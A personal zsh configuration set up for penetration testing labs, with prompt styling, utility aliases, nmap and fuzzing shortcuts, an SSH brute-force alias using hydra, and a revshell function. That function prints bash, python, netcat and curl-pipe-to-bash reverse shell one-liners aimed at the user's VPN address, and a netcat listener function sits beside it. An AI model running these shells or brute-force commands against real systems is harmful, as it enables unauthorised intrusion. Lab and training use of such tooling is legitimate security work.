# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# .zshrc — fyxvoid | Pentest Edition
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# ── Oh-My-Zsh ────────────────────────────────────────────────
export ZSH="$HOME/.oh-my-zsh"
ZSH_THEME=""
plugins=(git sudo)
source $ZSH/oh-my-zsh.sh

# system-installed plugins (safe — skipped if not present)
[[ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]] && \
    source /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
[[ -f /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]] && \
    source /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh

# ── Environment ──────────────────────────────────────────────
export EDITOR="nano"
export VISUAL="nano"
export TERM="xterm-256color"
export LANG="en_US.UTF-8"
export PATH="$HOME/.local/bin:$HOME/go/bin:/usr/local/go/bin:$PATH"
export GOPATH="$HOME/go"

# ── History ──────────────────────────────────────────────────
HISTSIZE=50000
SAVEHIST=50000
HISTFILE=~/.zsh_history
setopt HIST_IGNORE_DUPS
setopt HIST_IGNORE_SPACE
setopt SHARE_HISTORY
setopt INC_APPEND_HISTORY

# ── Completion ───────────────────────────────────────────────
autoload -Uz compinit && compinit
zstyle ':completion:*' menu select
zstyle ':completion:*' matcher-list 'm:{a-z}={A-Z}'
zstyle ':completion:*:descriptions' format '%F{yellow}-- %d --%f'
zstyle ':completion:*' list-colors "${(s.:.)LS_COLORS}"

# ── Prompt ───────────────────────────────────────────────────
# Two-line sharp prompt — no rounded chars
# Line 1: ┌─[user]─[path]─[git]─[vpn]─[target]
# Line 2: └─$

_p_vpn() {
    local ip
    ip=$(ip -4 addr show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1)
    [[ -n "$ip" ]] && printf ' %%F{#6ED9A0}──[vpn:%s]%%f' "$ip"
}

_p_target() {
    local f="$HOME/.config/pentest/target"
    [[ -f "$f" ]] || return
    local name ip
    read -r name ip < "$f"
    [[ -n "$name" ]] && printf ' %%F{#E87DA0}──[%s]%%f' "$name"
}

_p_git() {
    local branch
    branch=$(git rev-parse --abbrev-ref HEAD 2>/dev/null)
    [[ -n "$branch" ]] && printf ' %%F{#F0C040}──[%s]%%f' "$branch"
}

setopt PROMPT_SUBST

PROMPT='%F{#4A7080}┌─%f%F{#E87DA0}[%n]%f %F{#4A7080}──%f %F{#5BBAD6}[%~]%f$(_p_git)$(_p_vpn)$(_p_target)
%F{#4A7080}└─%f%B%F{#E87DA0}$%f%b '

RPROMPT='%F{#4A7080}%D{%H:%M:%S}%f'

# Autosuggestion style
ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE="fg=#4A7080"
ZSH_AUTOSUGGEST_STRATEGY=(history completion)

# ── Colors ───────────────────────────────────────────────────
[[ -x /usr/bin/dircolors ]] && eval "$(dircolors -b)"

# ── eza — ls with icons ───────────────────────────────────────
if command -v eza &>/dev/null; then
    alias ls='eza --icons --group-directories-first --color=auto'
    alias ll='eza -lah --icons --group-directories-first --git --color=auto'
    alias la='eza -a --icons --group-directories-first --color=auto'
    alias l='eza --icons --group-directories-first --color=auto'
    alias tree='eza --tree --icons --level=3 --color=auto'
else
    alias ls='ls --color=auto'
    alias ll='ls -lah --color=auto'
    alias la='ls -A --color=auto'
    alias l='ls -CF --color=auto'
fi

# ── bat — smart cat ───────────────────────────────────────────
if command -v batcat &>/dev/null; then
    alias cat='batcat --style=numbers,changes --theme=base16'
    alias bat='batcat'
    alias catp='batcat --style=plain --paging=never'
elif command -v bat &>/dev/null; then
    alias cat='bat --style=numbers,changes --theme=base16'
    alias catp='bat --style=plain --paging=never'
fi

# ── fzf — fuzzy finder ───────────────────────────────────────
if command -v fzf &>/dev/null; then
    [[ -f /usr/share/doc/fzf/examples/key-bindings.zsh ]] && \
        source /usr/share/doc/fzf/examples/key-bindings.zsh
    [[ -f /usr/share/doc/fzf/examples/completion.zsh ]] && \
        source /usr/share/doc/fzf/examples/completion.zsh
    export FZF_DEFAULT_OPTS="
        --color=bg+:#243545,bg:#1C2B35,spinner:#E87DA0,hl:#5BBAD6
        --color=fg:#D8EEF8,header:#5BBAD6,info:#F0C040,pointer:#E87DA0
        --color=marker:#E87DA0,fg+:#D8EEF8,prompt:#E87DA0,hl+:#5BBAD6
        --border=sharp --prompt='  ' --pointer='>' --marker='*'
        --height=40% --layout=reverse"
    alias fcd='cd $(find . -type d | fzf)'
fi

# ── zoxide — smart cd ────────────────────────────────────────
if command -v zoxide &>/dev/null; then
    eval "$(zoxide init zsh)"
fi

# ── Aliases — System ─────────────────────────────────────────
alias grep='grep --color=auto'
alias mkdir='mkdir -pv'
alias cp='cp -iv'
alias mv='mv -iv'
alias rm='rm -iv'
alias reload='source ~/.zshrc'
alias zshrc='$EDITOR ~/.zshrc'
alias cls='clear'
alias ports='ss -tulpn'
alias hosts='cat /etc/hosts'
alias path='echo $PATH | tr ":" "\n"'

# ── Aliases — Network ────────────────────────────────────────
alias myip='curl -s ifconfig.me && echo'
alias localip='ip -4 addr | awk "/inet /{print \$2}" | grep -v "127.0"'
alias tunip='ip -4 addr show tun0 2>/dev/null | awk "/inet /{print \$2}" | cut -d/ -f1'
alias sshk='ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null'

# ── Aliases — Target ─────────────────────────────────────────
alias target='cat ~/.config/pentest/target 2>/dev/null || echo "no target"'
alias cleartarget='rm -f ~/.config/pentest/target && echo "target cleared"'

# ── Aliases — Pentest ────────────────────────────────────────
alias nmap-q='nmap -sV -sC -oA quick'
alias nmap-full='sudo nmap -sV -sC -p- --min-rate 5000 -oA full'
alias nmap-udp='sudo nmap -sU --top-ports 200 -oA udp'
alias nmap-vuln='nmap --script vuln -oA vuln'

alias ffuf-dir='ffuf -w /usr/share/wordlists/dirb/common.txt -u'
alias ffuf-sub='ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.DOMAIN" -u'
alias gob='gobuster dir -w /usr/share/wordlists/dirb/common.txt -u'
alias ferox='feroxbuster -u'
alias nikto='nikto -h'
alias whatweb='whatweb -v'

# rockyou — unzip if needed
alias rockyou='[[ -f /usr/share/wordlists/rockyou.txt ]] && echo /usr/share/wordlists/rockyou.txt || (gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null && echo /usr/share/wordlists/rockyou.txt)'
alias seclists='[[ -d /usr/share/seclists ]] && echo /usr/share/seclists || echo "not installed: sudo apt install seclists"'

alias hydra-ssh='hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://'
alias john='john --wordlist=/usr/share/wordlists/rockyou.txt'
alias hc='hashcat'
alias msfconsole='msfconsole -q'
alias ligolo='sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up'

# ── Functions ────────────────────────────────────────────────

# Set HTB/THM target + create workspace
pentest() {
    if [[ -z "$1" || -z "$2" ]]; then
        echo "usage: pentest <name> <ip>"
        return 1
    fi
    local name="$1" ip="$2"
    mkdir -p ~/.config/pentest || { echo "[-] cannot create ~/.config/pentest"; return 1; }
    echo "$name $ip" > ~/.config/pentest/target
    mkdir -p ~/htb/$name/{nmap,web,loot,exploits,creds}
    cd ~/htb/$name
    echo "[+] Target   : $name"
    echo "[+] IP       : $ip"
    echo "[+] Workspace: ~/htb/$name"
}

# Quick nmap scan
scan() {
    [[ -z "$1" ]] && { echo "usage: scan <ip>"; return 1; }
    sudo nmap -sV -sC --min-rate 3000 -oA "scan_$1" "$1"
}

# Serve current dir over HTTP
serve() {
    command -v python3 &>/dev/null || { echo "[-] python3 not found"; return 1; }
    local port="${1:-8080}"
    echo "[+] Serving $(pwd) on :$port"
    python3 -m http.server "$port"
}

# Base64
b64e() { echo -n "$1" | base64; }
b64d() { echo -n "$1" | base64 -d; }

# URL encode
urlencode() { python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1"; }

# Extract any archive
extract() {
    case "$1" in
        *.tar.gz|*.tgz)   tar xzvf "$1" ;;
        *.tar.bz2|*.tbz)  tar xjvf "$1" ;;
        *.tar.xz)         tar xJvf "$1" ;;
        *.zip)            unzip "$1"     ;;
        *.gz)             gunzip "$1"    ;;
        *.7z)             7z x "$1"      ;;
        *.rar)            unrar x "$1"   ;;
        *)                echo "unknown: $1" ;;
    esac
}

# Reverse shell one-liners (print only)
revshell() {
    local ip="${1:-$(ip -4 addr show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1)}"
    local port="${2:-4444}"
    echo "── bash ──────────────────────────────────────────────"
    echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo "── python ────────────────────────────────────────────"
    echo "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    echo "── nc ────────────────────────────────────────────────"
    echo "nc -e /bin/sh $ip $port"
    echo "── curl pipe ─────────────────────────────────────────"
    echo "curl http://$ip:8080/shell.sh | bash"
}

# Netcat listener — handles both traditional and openbsd variants
listen() {
    local port="${1:-4444}"
    echo "[+] Listening on :$port"
    if nc -h 2>&1 | grep -q "\-e"; then
        nc -lvnp "$port"
    else
        nc -l -n -v -p "$port"
    fi
}
